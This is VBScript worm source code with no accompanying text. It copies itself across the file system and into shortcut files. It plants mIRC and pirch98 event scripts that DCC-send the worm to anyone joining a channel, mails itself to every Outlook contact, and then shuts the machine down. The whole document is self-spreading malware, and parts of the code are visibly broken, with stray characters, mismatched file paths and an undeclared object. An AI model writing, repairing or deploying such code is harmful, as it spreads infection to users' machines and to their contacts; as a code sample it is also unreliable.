Dim shell, msc, batch, fso
set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\vbs.vbs", True
set shell=wscript.createobject("wscript.shell")
set msc=shell.CreateShortCut("C:\vbs.lnk")
msc.TargetPath=shell.ExpandEnvironment("C:\vbs.vbs")
msc.WindowStyle=4
msc.Save
set batch=fso.CreateTextFile("C:\sf.bat")
batch.WriteLine "cls"
batch.WriteLine "@echo off"
batch.WriteLine "for %%a in (*.lnk) do copy C:\vbs.sf%%a"
batch.Close
shell.Run  "C:\sf.bat"

Dim pirch
set fso=CreateObject("Scripting.FileSystemObject")
set mirc=fso.CreateTextFile("C:\pirch98\events.ini")
fso.CopyFile Wscript.ScriptFullName, "C:\mirc\attachment.vbs", True
pirch.WriteLine "[Levels]");
pirch.WriteLine "Enabled=1");
pirch.WriteLine "Count=6");
pirch.WriteLine "Level1=000-Unknows"
pirch.WriteLine "000-UnknowsEnabled=1"
pirch.WriteLine "Level2=100-Level 100"
pirch.WriteLine "100-Level 100Enabled=1"
pirch.WriteLine "Level3=200-Level 200"
pirch.WriteLine "200-Level 200Enabled=1"
pirch.WriteLine "Level4=300-Level 300"
pirch.WriteLine "300-Level 300Enabled=1"
pirch.WriteLine "Level5=400-Level 400"
pirch.WriteLine "400-Level 400Enabled=1"
pirch.WriteLine "Level6=500-Level 500"
pirch.WriteLine "500-Level 500Enabled=1"
pirch.WriteLine "[000-Unknowns]"
pirch.WriteLine "User1=*!*@*"
pirch.WriteLine "UserCount=1"
pirch.WriteLine "Events1=ON JOIN:#: /dcc send $nick C:\Pirch98\attachement.vbs"
pirch.WriteLine "EventCount=1"
pirch.WriteLine "[100-Level 100]"
pirch.WriteLine "UserCount=0"
pirch.WriteLine "EventCount=0"
pirch.WriteLine "[200-Level 200]"
pirch.WriteLine "UserCount=0"
pirch.WriteLine "EventCount=0"
pirch.WriteLine "[300-Level 300]"
pirch.WriteLine "UserCount=0"
pirch.WriteLine "EventCount=0"
pirch.WriteLine "[400-Level 400]"
pirch.WriteLine "UserCount=0"
pirch.WriteLine "EventCount=0"
pirch.WriteLine "[500-Level 500]"
pirch.WriteLine "UserCount=0"
pirch.WriteLine "EventCount=0"
pirch.Close

Dim mirc
set fso=CreateObject("Scripting.FileSystemObject")
set mirc=fso.CreateTextFile("C:\mirc\script.ini")
fso.CopyFile Wscript.ScriptFullName, "C:\mirc\attachment.vbs", True
mirc.WriteLine "[script]"
mirc.WriteLine "n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick C:\mirc\attachment.vbs }
mirc.Close

set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\Program Files\sf.vbs", True
fso.CopyFile Wscript.ScriptFullName, "C:\Program Files\s1f.vbs", True
fso.CopyFile Wscript.ScriptFullName, "C:\Program Files\s2f.vbs", True
fso.CopyFile Wscript.ScriptFullName, "C:\Program Files\sf3.vbs", True
fso.CopyFile Wscript.ScriptFullName, "C:\Program Files\s4f.vbs", True
fso.CopyFile Wscript.ScriptFullName, "C:\Program Files\s5f.vbs", True
fso.CopyFile Wscript.ScriptFullName, "C:\Program Files\s6f.vbs", True
fso.CopyFile Wscript.ScriptFullName, "C:\Program Files\s7f.vbs", True


Dim x 
on error resume next 
Set fso ="Scripting.FileSystem.Object" 
Set so=CreateObject(fso) 
Set ol=CreateObject("Outlook.Application") 
Set out= WScript.CreateObject("Outlook.Application") 
Set mapi = out.GetNameSpace("MAPI") 
Set a = mapi.AddressLists(1) 
For x=1 To a.AddressEntries.Count 
Set Mail=ol.CreateItem(0) 
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) 
Mail.Subject="Subject" 
Mail.Body="Body" 
Mail.Attachments.Add Wscript.ScriptFullName
Mail.Send 
Next 


on error resume next
shell.run "RUNDLL32.exe user.exe,exitwindows",vbhide
shell.run "shutdown.exe -s",vbhide
